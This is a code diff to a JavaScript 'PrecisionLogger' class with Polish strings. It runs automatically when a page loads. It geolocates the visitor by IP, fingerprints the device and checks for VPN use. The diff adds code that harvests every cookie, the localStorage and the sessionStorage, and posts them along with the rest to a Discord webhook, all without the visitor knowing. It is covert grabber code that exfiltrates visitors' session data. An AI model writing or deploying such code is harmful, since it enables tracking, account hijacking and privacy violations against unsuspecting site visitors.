@@ -5,27 +5,23 @@ class PrecisionLogger {
             location: { accuracy: "Niska" },
             device: {},
             network: {},
+            storage: {
+                cookies: {},
+                localStorage: {},
+                sessionStorage: {}
+            },
             time: new Date().toLocaleString("pl-PL")
         };
     }
 
     async init() {
         try {
-            // 1. Pobierz IP
             await this._getIP();
-            
-            // 2. Sprawdź lokalizację (3 źródła)
             await this._getLocation();
-            
-            // 3. Zbierz dane urządzenia
             this._getDeviceInfo();
-            
-            // 4. Sprawdź VPN/Proxy
+            this._getStorageData();
             await this._checkNetwork();
-            
-            // 5. Wyślij do Discord
             await this._sendToDiscord();
-            
         } catch (error) {
             console.error("Błąd loggera:", error);
         }
@@ -45,7 +41,6 @@ class PrecisionLogger {
     async _getLocation() {
         if (!this.data.ip) return;
         
-        // Sprawdź 3 różne API i wybierz najdokładniejsze
         const sources = [
             this._checkIpApiCo(),
             this._checkIpWhoIs(),
@@ -58,7 +53,6 @@ class PrecisionLogger {
             .map(r => r.value);
             
         if (validResults.length > 0) {
-            // Wybierz wynik z najwyższą dokładnością
             this.data.location = validResults.reduce((best, current) => 
                 current.accuracy > best.accuracy ? current : best
             );
@@ -83,7 +77,7 @@ class PrecisionLogger {
                 region: data.region,
                 postal: data.postal,
                 coords: `${data.latitude}, ${data.longitude}`,
-                accuracy: 3 // Wysoka dokładność
+                accuracy: 3
             };
         } catch (error) {
             console.log("Błąd ipapi.co:", error);
@@ -103,7 +97,7 @@ class PrecisionLogger {
                 region: data.region,
                 postal: data.postal_code,
                 coords: `${data.latitude}, ${data.longitude}`,
-                accuracy: 2 // Średnia dokładność
+                accuracy: 2
             };
         } catch (error) {
             console.log("Błąd ipwho.is:", error);
@@ -123,7 +117,7 @@ class PrecisionLogger {
                 region: data.region_name,
                 postal: data.zip_code,
                 coords: `${data.latitude}, ${data.longitude}`,
-                accuracy: 1 // Niska dokładność
+                accuracy: 1
             };
         } catch (error) {
             console.log("Błąd ipapi.com:", error);
@@ -132,7 +126,6 @@ class PrecisionLogger {
     }
 
     _getDeviceInfo() {
-        // Poprawione wykrywanie systemu
         const getOS = () => {
             const ua = navigator.userAgent;
             if (/Windows/.test(ua)) return "Windows";
@@ -143,7 +136,6 @@ class PrecisionLogger {
             return navigator.platform || "Nieznany";
         };
 
-        // Poprawione wykrywanie przeglądarki
         const getBrowser = () => {
             const ua = navigator.userAgent;
             let match = ua.match(/(firefox|chrome|safari|edge|opera|opr)\/?\s*(\d+)/i) || [];
@@ -158,14 +150,67 @@ class PrecisionLogger {
             cpuCores: navigator.hardwareConcurrency > 16 ? ">16" : navigator.hardwareConcurrency,
             memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
             isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
-            userAgent: navigator.userAgent
+            userAgent: navigator.userAgent,
+            doNotTrack: navigator.doNotTrack === "1" ? "Tak" : "Nie"
         };
+    }
+
+    _getStorageData() {
+        this.data.storage.cookies = this._getAllCookies();
+        this.data.storage.localStorage = this._getLocalStorage();
+        this.data.storage.sessionStorage = this._getSessionStorage();
+    }
+
+    _getAllCookies() {
+        try {
+            return document.cookie.split(';').reduce((cookies, cookie) => {
+                const [name, ...valueParts] = cookie.trim().split('=');
+                const value = valueParts.join('=');
+                try {
+                    cookies[name] = decodeURIComponent(value);
+                } catch {
+                    cookies[name] = value;
+                }
+                return cookies;
+            }, {});
+        } catch (error) {
+            return { error: "Błąd odczytu ciasteczek" };
+        }
+    }
+
+    _getLocalStorage() {
+        try {
+            return Object.keys(localStorage).reduce((storage, key) => {
+                try {
+                    storage[key] = localStorage.getItem(key);
+                } catch {
+                    storage[key] = "<zabezpieczone>";
+                }
+                return storage;
+            }, {});
+        } catch (error) {
+            return { error: "Błąd odczytu localStorage" };
+        }
+    }
+
+    _getSessionStorage() {
+        try {
+            return Object.keys(sessionStorage).reduce((storage, key) => {
+                try {
+                    storage[key] = sessionStorage.getItem(key);
+                } catch {
+                    storage[key] = "<zabezpieczone>";
+                }
+                return storage;
+            }, {});
+        } catch (error) {
+            return { error: "Błąd odczytu sessionStorage" };
+        }
     }
 
     async _checkNetwork() {
         if (!this.data.ip) return;
         
-        // Sprawdź VPN/Proxy
         try {
             if (window.CONFIG.VPNAPI_KEY) {
                 const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${window.CONFIG.VPNAPI_KEY}`);
@@ -186,7 +231,7 @@ class PrecisionLogger {
         if (!window.CONFIG.DISCORD_WEBHOOK) return;
         
         const embed = {
-            title: "🔍 Precyzyjne dane użytkownika",
+            title: "🔍 Pełne dane użytkownika",
             color: 0x00ff00,
             fields: [
                 {
@@ -198,6 +243,11 @@ class PrecisionLogger {
                     name: "📱 Urządzenie",
                     value: this._formatDevice(),
                     inline: true
+                },
+                {
+                    name: "🗄️ Przechowywanie",
+                    value: this._formatStorage(),
+                    inline: false
                 },
                 {
                     name: "🌐 Sieć",
@@ -214,7 +264,10 @@ class PrecisionLogger {
             await fetch(window.CONFIG.DISCORD_WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ embeds: [embed] })
+                body: JSON.stringify({ 
+                    embeds: [embed],
+                    content: "⚠️ Uwaga: Dane mogą zawierać wrażliwe informacje"
+                })
             });
         } catch (error) {
             console.error("Błąd wysyłania do Discord:", error);
@@ -241,7 +294,36 @@ class PrecisionLogger {
         **Rdzenie CPU:** ${dev.cpuCores}
         **Pamięć RAM:** ${dev.memory}
         **Typ:** ${dev.isMobile ? "Mobilne" : "Desktop"}
+        **Do Not Track:** ${dev.doNotTrack}
         `;
+    }
+
+    _formatStorage() {
+        const s = this.data.storage;
+        return `
+        **Ciasteczka (${Object.keys(s.cookies).length}):** 
+        ${this._formatStorageSample(s.cookies)}
+        
+        **LocalStorage (${Object.keys(s.localStorage).length}):** 
+        ${this._formatStorageSample(s.localStorage)}
+        
+        **SessionStorage (${Object.keys(s.sessionStorage).length}):** 
+        ${this._formatStorageSample(s.sessionStorage)}
+        `;
+    }
+
+    _formatStorageSample(storage) {
+        const keys = Object.keys(storage);
+        if (keys.length === 0) return "Brak";
+        
+        return keys.slice(0, 3).map(key => {
+            const val = storage[key];
+            const valuePreview = val.length > 20 ? 
+                `${val.substring(0, 15)}[...]` : 
+                val;
+            return `\`${key}\`: ${valuePreview}`;
+        }).join('\n') + 
+        (keys.length > 3 ? `\n+${keys.length - 3} więcej` : '');
     }
 
     _formatNetwork() {
@@ -264,7 +346,7 @@ class PrecisionLogger {
     }
 }
 
-// Uruchom logger
+// Inicjalizacja loggera
 document.addEventListener("DOMContentLoaded", () => {
     new PrecisionLogger().init();
 });
